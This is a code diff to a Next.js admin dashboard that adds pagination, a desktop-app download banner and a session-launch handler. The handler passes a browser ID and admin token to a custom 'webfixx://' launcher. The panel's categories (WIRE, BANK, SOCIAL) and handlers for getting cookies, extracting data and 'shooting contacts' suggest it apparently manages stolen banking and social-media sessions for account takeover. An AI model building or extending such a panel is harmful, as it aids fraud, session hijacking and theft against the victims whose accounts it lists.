@@ -5,13 +5,14 @@ import Link from 'next/link';
 import { useAppState } from '../context/AppContext';
 import { DashboardTabs } from '../components/admin/dashboard/DashboardTabs';
 import { ItemDetailsModal } from '../components/admin/dashboard/ItemDetailsModal';
+import { Pagination } from '../components/admin/dashboard/Pagination';
 import { WireTable } from '../components/admin/dashboard/wire/WireTable';
 import { BankTable } from '../components/admin/dashboard/bank/BankTable';
 import { SocialTable } from '../components/admin/dashboard/social/SocialTable';
-import LoadingSpinner from '../components/LoadingSpinner'; // Import LoadingSpinner
-import { authApi } from '../../utils/auth'; // Import authApi
-import { FontAwesomeIcon } from '@fortawesome/react-fontawesome'; // Import FontAwesomeIcon
-import { faSync, faChartLine } from '@fortawesome/free-solid-svg-icons'; // Import faSync and faChartLine
+import LoadingSpinner from '../components/LoadingSpinner';
+import { authApi } from '../../utils/auth';
+import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
+import { faSync, faChartLine, faDownload } from '@fortawesome/free-solid-svg-icons';
 
 export default function Dashboard() {
   const { appData, setAppData } = useAppState(); // Destructure setAppData
@@ -20,17 +21,23 @@ export default function Dashboard() {
   const [selectedItem, setSelectedItem] = useState<string | null>(null);
   const [activeCategory, setActiveCategory] = useState<'WIRE' | 'BANK' | 'SOCIAL' | null>(null);
   const [memoInput, setMemoInput] = useState<{ id: string; text: string } | null>(null);
+  const [currentPage, setCurrentPage] = useState(1);
+  const [dismissDownload, setDismissDownload] = useState(false);
+  const ITEMS_PER_PAGE = 25;
+
+  // Reset to page 1 when category changes
+  useEffect(() => {
+    setCurrentPage(1);
+  }, [activeCategory]);
 
   // Transform hub data from array format to object format
   const hubData = useMemo(() => {
     if (!appData?.data?.hub?.data || !Array.isArray(appData.data.hub.data)) {
-      console.log('No hub data available:', appData?.data?.hub);
       return [];
     }
 
     const headers = appData.data.hub.headers || [];
-    
-    return appData.data.hub.data.map(row => {
+    const rows = appData.data.hub.data.map(row => {
       const item: any = {};
       headers.forEach((header: string, index: number) => {
         if (header) {
@@ -38,7 +45,6 @@ export default function Dashboard() {
         }
       });
       
-      // Parse JSON strings if needed
       try {
         if (item.banks) item.banks = JSON.parse(item.banks);
         if (item.socials) item.socials = JSON.parse(item.socials);
@@ -50,6 +56,14 @@ export default function Dashboard() {
       }
       
       return item;
+    });
+
+    // Sort by timestamp descending (newest first), fallback to reverse insertion order
+    return rows.sort((a, b) => {
+      if (a.timestamp && b.timestamp) {
+        return new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime();
+      }
+      return 0;
     });
   }, [appData?.data?.hub]);
 
@@ -143,6 +157,25 @@ export default function Dashboard() {
     }
   };
 
+  const handleOpenSession = (browserId: string) => {
+    const token = document.cookie.match('(^|;)\\s*loggedInAdmin\\s*=\\s*([^;]+)')?.pop();
+    if (!token) return;
+    const apiUrl = process.env.API_BASE_URL || 'https://web-fixx-hoo.vercel.app/api';
+    let appOpened = false;
+    const onBlur = () => { appOpened = true; };
+    const onVisibility = () => { if (document.hidden) appOpened = true; };
+    window.addEventListener('blur', onBlur);
+    document.addEventListener('visibilitychange', onVisibility);
+    window.location.href = `webfixx://launch?browserId=${browserId}&token=${token}&api=${encodeURIComponent(apiUrl)}`;
+    setTimeout(() => {
+      window.removeEventListener('blur', onBlur);
+      document.removeEventListener('visibilitychange', onVisibility);
+      if (!appOpened) {
+        window.location.href = '/downloads/WebFixx-Session-Launcher-Setup.exe';
+      }
+    }, 1500);
+  };
+
   const handleMemoSave = async (id: string, text: string) => {
     try {
       // Implement memo save functionality
@@ -159,34 +192,61 @@ export default function Dashboard() {
   const renderTable = () => {
     if (!activeCategory) return null;
 
+    const allRows = categorizedData[activeCategory] || [];
+    const totalPages = Math.ceil(allRows.length / ITEMS_PER_PAGE);
+    const startIdx = (currentPage - 1) * ITEMS_PER_PAGE;
+    const paginatedData = allRows.slice(startIdx, startIdx + ITEMS_PER_PAGE);
+
     const commonProps = {
-      data: categorizedData[activeCategory] || [],
+      data: paginatedData,
       onRowClick: handleRowClick,
       selectedId: selectedItem,
       onVerify: handleVerify,
       onGetCookie: handleGetCookie,
       onCopy: handleCopy,
       onExtract: handleExtract,
+      onOpenSession: handleOpenSession,
       onMemoSave: handleMemoSave,
       loading,
     };
 
+    const pagination = allRows.length > ITEMS_PER_PAGE ? (
+      <Pagination
+        currentPage={currentPage}
+        totalPages={totalPages}
+        totalItems={allRows.length}
+        itemsPerPage={ITEMS_PER_PAGE}
+        onPageChange={setCurrentPage}
+      />
+    ) : null;
+
     switch (activeCategory) {
       case 'WIRE':
         return (
-          <WireTable 
-            {...commonProps}
-            onShootContacts={handleShootContacts}
-          />
+          <>
+            <WireTable 
+              {...commonProps}
+              onShootContacts={handleShootContacts}
+            />
+            {pagination}
+          </>
         );
       case 'BANK':
-        return <BankTable {...commonProps} />;
+        return (
+          <>
+            <BankTable {...commonProps} />
+            {pagination}
+          </>
+        );
       case 'SOCIAL':
         return (
-          <SocialTable 
-            {...commonProps}
-            onShootContacts={handleShootContacts}
-          />
+          <>
+            <SocialTable 
+              {...commonProps}
+              onShootContacts={handleShootContacts}
+            />
+            {pagination}
+          </>
         );
       default:
         return null;
@@ -211,15 +271,35 @@ export default function Dashboard() {
         </div>
       ) : (
         <div className="p-6">
-          <div className="flex justify-start items-center mb-6">
+          <div className="flex justify-between items-center mb-6">
             <button
               onClick={handleRefreshData}
               className="bg-gray-200 dark:bg-gray-700 text-gray-800 dark:text-white px-4 py-2 rounded flex items-center hover:bg-gray-300 dark:hover:bg-gray-600 transition-colors duration-200"
               title="Refresh Data"
               disabled={refreshing}
             >
-              <FontAwesomeIcon icon={faSync} className={`mr-2 text-lg ${refreshing ? 'animate-spin' : ''}`} /> Get Update
+              <FontAwesomeIcon icon={faSync} className={`text-lg ${refreshing ? 'animate-spin' : ''}`} />
+              <span className="ml-2 hidden sm:inline">Get Update</span>
             </button>
+            {!dismissDownload && (
+              <div className="flex items-center gap-2">
+                <a
+                  href="/downloads/WebFixx-Session-Launcher-Setup.exe"
+                  className="bg-indigo-600 hover:bg-indigo-700 text-white px-4 py-2 rounded flex items-center gap-2 text-sm transition-colors"
+                  title="Download Desktop App"
+                >
+                  <FontAwesomeIcon icon={faDownload} className="text-lg" />
+                  <span className="hidden sm:inline">Desktop App</span>
+                </a>
+                <button
+                  onClick={() => setDismissDownload(true)}
+                  className="text-gray-400 hover:text-gray-600 dark:hover:text-gray-200 text-lg leading-none"
+                  title="Dismiss"
+                >
+                  ×
+                </button>
+              </div>
+            )}
           </div>
 
           <DashboardTabs
@@ -241,6 +321,7 @@ export default function Dashboard() {
             onGetCookie={handleGetCookie}
             onExtract={handleExtract}
             onShootContacts={handleShootContacts}
+            onOpenSession={handleOpenSession}
             onMemoSave={handleMemoSave}
             loading={loading}
           />
